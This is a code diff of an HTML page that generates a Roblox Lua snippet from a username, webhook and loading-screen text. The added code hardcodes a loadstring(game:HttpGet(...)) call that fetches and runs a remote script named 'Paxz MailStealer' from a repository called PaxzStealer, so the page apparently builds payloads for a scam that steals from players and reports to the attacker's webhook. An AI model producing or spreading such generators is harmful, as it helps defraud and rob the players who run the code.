@@ -1,72 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>Textbox Generator</title>
-	<style>
-		body {
-			background-image: url('https://wallpapercave.com/wp/wp4575209.jpg');
-			background-size: cover;
-		}
-		.textbox {
-			width: 300px;
-			height: 30px;
-			margin-bottom: 10px;
-			font-size: 16px;
-			border-radius: 5px;
-			border: none;
-			padding: 5px;
-		}
-		.textbox4 {
-			width: 300px;
-			height: 120px;
-			margin-bottom: 10px;
-			font-size: 16px;
-			border-radius: 5px;
-			border: none;
-			padding: 5px;
-		}
-		.button {
-			background-color: #4CAF50;
-			border: none;
-			color: white;
-			padding: 10px 20px;
-			text-align: center;
-			text-decoration: none;
-			display: inline-block;
-			font-size: 16px;
-			margin-bottom: 10px;
-			cursor: pointer;
-			border-radius: 5px;
-		}
-	</style>
-</head>
-<body>
-	<div align="center">
-		<form>
-			<input class="textbox" type="text" placeholder="Username" id="username"><br>
-			<input class="textbox" type="text" placeholder="Webhook" id="webhook"><br>
-			<input class="textbox" type="text" placeholder="Loading Text" id="loadingtext"><br>
-			<textarea class="textbox4" placeholder="Script" id="script"></textarea><br>
-			<button class="button" type="button" onclick="generateCode()">Generate Code</button><br>
-		</form>
-	</div>
+  <head>
+    <meta charset="UTF-8">
+    <title>GitHub Pages Script Generator</title>
+  </head>
+  <body>
+    <h1>GitHub Pages Script Generator</h1>
+    <form>
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="webhook">Webhook:</label><br>
+      <input type="text" id="webhook" name="webhook"><br>
+      <label for="loadingText">LoadingText:</label><br>
+      <input type="text" id="loadingText" name="loadingText"><br>
+      <label for="output">Script Output:</label><br>
+      <textarea id="output" rows="10" cols="50"></textarea><br>
+      <input type="button" value="Generate Script" onclick="generateScript();">
+    </form>
 
-	<script>
-		function generateCode() {
-			var username = document.getElementById("username").value;
-			var webhook = document.getElementById("webhook").value;
-			var loadingtext = document.getElementById("loadingtext").value;
-			var script = document.getElementById("script").value;
+    <script>
+      function generateScript() {
+        var username = document.getElementById("username").value;
+        var webhook = document.getElementById("webhook").value;
+        var loadingText = document.getElementById("loadingText").value;
 
-			var code = "_G.UserName = \"" + username + "\"\n";
-			code += "_G.Webhook = \"" + webhook + "\"\n";
-			code += "_G.loadingScreenText = \"" + loadingtext + "\"\n";
-			code += "\n";
-			code += "loadstring(game:HttpGet(\"" + script + "\"))()";
+        var script = '_G.UserName = "' + username + '"\n';
+        script += '_G.Webhook = "' + webhook + '"\n';
+        script += '_G.loadingScreenText = "' + loadingText + '"\n\n';
+        script += 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
 
-			navigator.clipboard.writeText(code);
-			alert("Code copied to clipboard!");
-		}
-	</script>
-</body>
+        document.getElementById("output").value = script;
+      }
+    </script>
+  </body>
 </html>
